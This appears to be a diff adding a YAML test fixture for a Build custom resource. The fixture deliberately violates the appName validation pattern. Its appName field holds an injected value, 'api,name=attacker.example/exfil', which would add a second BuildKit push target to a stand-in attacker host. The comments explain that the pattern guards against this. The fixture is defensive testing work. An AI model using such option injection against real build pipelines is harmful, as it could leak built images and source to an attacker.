@@ -1,0 +1,16 @@
+# Violates: BuildSpec.appName OpenAPI pattern — DNS-1123 subdomain only.
+# A comma here would inject options into the BuildKit --output CSV (e.g. a
+# second push target), so the pattern is load-bearing for INV-02.
+apiVersion: orkano.io/v1alpha1
+kind: Build
+metadata:
+  name: invalid-appname
+  namespace: orkano-apps
+spec:
+  appName: api,name=attacker.example/exfil
+  commit: 0123456789abcdef0123456789abcdef01234567
+  source:
+    github:
+      repo: alice/app
+  strategy:
+    strategy: Dockerfile
